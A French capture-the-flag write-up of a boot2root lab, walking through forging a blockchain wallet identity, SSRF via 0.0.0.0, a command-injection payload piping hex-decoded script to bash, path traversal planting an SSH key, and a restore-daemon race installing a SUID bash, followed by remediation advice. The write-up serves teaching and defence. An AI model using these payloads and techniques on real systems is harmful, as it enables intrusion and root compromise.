# Agoè — forger un portefeuille, SSRF et course au démon de restauration

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/agoe/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Le portail « Agoè Chain » charge un portefeuille sans vérifier que
> la clé privée correspond à la clé publique : on se fait passer pour l'adresse
> la plus riche (64 Kola) et on débloque l'espace VIP. De là, une SSRF vers
> `0.0.0.0` fait croire au panneau admin qu'on vient de `127.0.0.1`, et une
> injection de commande dans `ping_node` donne un shell `kossi`. Un contrat de
> débogage écrit une clé SSH pour `afivi` (traversée de répertoire), puis une
> course sur le démon de restauration root installe un `bash` SUID.
> **Flag :** `/root/root.txt` → `NCTF{…}` (lab).

## 1. Briefing

Machine boot2root Linux (Docker), difficulté *easy/medium*. Un seul flag :
`/root/root.txt`, lisible uniquement par root. Plusieurs services exposés, dont
beaucoup sont des leurres.

| Champ | Valeur |
|-------|--------|
| Cible | lab éphémère (une IP) |
| Ports | `8080` portail, `22` SSH, `15432`+`16100-16104` FTP, `8081` explorateur, `9090` supervision |
| Leurres | Redis `6379`, faucet `5001`, Grafana `3000`, audit `8000` |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl -s http://<ip>:8080/            # portail Agoè Chain
curl -s http://<ip>:8081/            # explorateur public (blocs + transactions)
curl -s http://<ip>:8080/mining_data # chaîne complète + transactions en attente
```

`/mining_data` renvoie toute la chaîne **et** le pool en attente. La supervision
(`9090`) expose un `/config` avec des identifiants `backup` factices : un leurre,
ils ne servent nulle part.

## 3. Analyse

Le solde d'une adresse se calcule en cumulant les montants reçus et en retirant
les montants envoyés (les récompenses `Blockchain_Reward` sont des crédits
purs) :

```python
bal = defaultdict(int)
for block in chain[1:]:               # on saute le bloc genèse
    for txn in block["data"]:
        bal[txn["receiver"]] += txn["amount"]
        if txn["sender"] != "Blockchain_Reward":
            bal[txn["sender"]] -= txn["amount"]
```

Une adresse ressort à **64 Kola** (seuil VIP : 10). Sa clé privée n'est pas sur
le serveur : la chaîne ne contient qu'une clé publique. Il faudra donc **forger**
l'identité plutôt que la voler.

## 4. Exploitation

### Étape 1 — forger le portefeuille (faille d'identité)

`POST /dashboard/wallet?action=load` lit le JSON et fait, sans aucune
vérification de cohérence entre les deux clés :

```python
self.priv_key = SigningKey.from_string(private_key)   # notre clé fraîche
self.pub_key  = VerifyingKey.from_string(public_key)  # clé publique riche
self.address  = data["public_key"]                    # adresse = clé publique
```

Il suffit de créer une paire neuve (`action=create`) puis de recharger la nôtre
avec l'adresse riche :

```json
{"private_key": "<clé fraîche>", "public_key": "<adresse riche>"}
```

`/dashboard/info` affiche alors **64 Kola** et `/dashboard/vip/nodes` s'ouvre.

### Étape 2 — SSRF vers la boucle locale

`is_internal_address()` refuse seulement `is_loopback`. Or `0.0.0.0` n'est pas
considéré comme local par `ipaddress`. On enregistre un nœud
`http://0.0.0.0:8080/...` ; le test serveur (`requests.get`) part depuis la
machine, donc arrive avec `remote_addr == 127.0.0.1`, ce qui satisfait
`is_admin()` du panneau `/admin`.

### Étape 3 — injection de commande dans `ping_node`

```python
ip = extract_ip_from_url(target)   # retire http(s)://, split('/')[0], split(':')[0]
subprocess.check_output(f"ping -w 4{ip}", shell=True)
```

`extract_ip_from_url` ne filtre que `/` et `:`. On injecte avec `&` et `${IFS}`
(pour éviter espaces et slashs), puis on décode un script hexadécimal :

```text
http://foo&echo${IFS}<hex>|xxd${IFS}-r${IFS}-p|bash&@<IP_INSTANCE>/
```

La sortie revient dans un bloc `<pre class="output">`. Premier test : `id` →
`uid=1000(kossi)`.

### Étape 4 — pivot kossi → afivi (contrat de débogage)

Le serveur de dev écoute sur `127.0.0.1:5000` sous `afivi`. Depuis `kossi`, on
lui parle en local et on dépose un contrat malveillant :

```json
{
  "name": "kola-swap",
  "logic": {"claim": "allow"},
  "debug": "True",
  "__meta__": {
    "log_file": "../../../../home/afivi/.ssh/authorized_keys",
    "log_content": {"on_claim": "\n<clé publique de l'attaquant>\n"}
  }
}
```

`run_hook` ouvre `LOG_ROOT + "/" + file` sans validation : traversée de
répertoire, écriture en `afivi`. La ligne parasite `[date] [hook]` est ignorée
par sshd ; la clé, elle, est valide. SSH en `afivi` (groupe `developers`).

### Étape 5 — afivi → root (course sur le démon de restauration)

Le démon root boucle toutes les 5 s : il détecte `/opt/agoechain/restore`,
télécharge l'archive FTP (identifiants `ftpuser` lisibles dans le script),
vérifie `sha256sum`, écrit « somme de contrôle validée » dans
`/var/log/restore.log`, **attend 0,35 s**, puis `tar xvf archive -C /` en root.

Entre la vérification et le `tar`, l'archive validée peut être remplacée. Le
fichier téléchargé est `root:600`, mais le **dossier** est inscriptible par le
groupe `developers` : un `rename()` (pas une copie) échange le fichier sans
toucher ses permissions.

```bash
# archive construite DANS le conteneur (libc différente de l'hôte)
tar --owner=0 --group=0 --mode=4755 \
    --transform='s|^bash$|opt/agoechain/.diag|' \
    -czf evil.tar.gz -C /bin bash
```

Un surveillant lit `/var/log/restore.log` en continu et fait `os.replace()` dès
la ligne de validation. Le `tar` root installe alors `/opt/agoechain/.diag` =
`/bin/bash` SUID root.

## 5. Flag

```bash
/opt/agoechain/.diag -p -c 'cat /root/root.txt'
# NCTF{…}
```

`bash -p` conserve l'EUID 0 malgré le SUID. (Flag tronqué selon la politique du
site ; le lab le régénère à chaque reset.)

## 6. Impasses & leurres

- `/opt/agoechain/.diag` existe déjà : script de diagnostic bénin (mode 755),
  **pas** le SUID.
- **Redis (6379)** : clés plausibles (`dao:admin:token`, `session:7abc3`…),
  toutes décoratives.
- **Faucet (5001)** : ledger *testnet* séparé ; miner 10 fois ne débloque jamais
  le VIP principal.
- **Grafana (3000)** : `admin:admin` accepté, mais que du décoratif.
- **Audit (8000)** : trois rapports décrivent des correctifs fictifs (SSRF
  « patché », realpath en dev). Rien ne reflète le comportement réel.
- Une copie naïve (`cp`) de l'archive échoue : il faut un `rename()` du dossier.
- Aucune clé privée de l'adresse riche n'est présente : le portefeuille se
  **forge**, il ne se vole pas.

## 7. Leçons & remédiation

- **Vérifier la cohérence des clés.** Au chargement d'un portefeuille, dériver la
  clé publique de la clé privée et la comparer ; refuser sinon.
- **Bloquer la SSRF correctement.** Interdire aussi `0.0.0.0`, les adresses
  liées, et résoudre/valider l'IP finale — pas seulement `is_loopback`.
- **Ne jamais construire une commande shell par concaténation.** `ping` doit
  recevoir une IP validée en argument (`subprocess` sans `shell=True`), jamais
  une chaîne interpolée.
- **Traversée de répertoire.** `open(LOG_ROOT + "/" + file)` sans
  `os.path.realpath` + préfixe vérifié permet d'écrire n'importe où.
- **Course TOCTOU.** Vérifier puis extraire la même archive sans la rouvrir, dans
  un répertoire non inscriptible par le groupe, et comparer le hash du descripteur
  ouvert — pas du chemin.

## 8. Annexe — calcul du solde

```python
from collections import defaultdict
def balances(chain, pending):
    bal = defaultdict(int)
    for block in chain[1:]:
        for t in block["data"]:
            bal[t["receiver"]] += t["amount"]
            if t["sender"] != "Blockchain_Reward":
                bal[t["sender"]] -= t["amount"]
    for t in pending:
        bal[t["receiver"]] += t["amount"]
        if t["sender"] != "Blockchain_Reward":
            bal[t["sender"]] -= t["amount"]
    return max(bal.items(), key=lambda kv: kv[1])   # adresse la plus riche
```
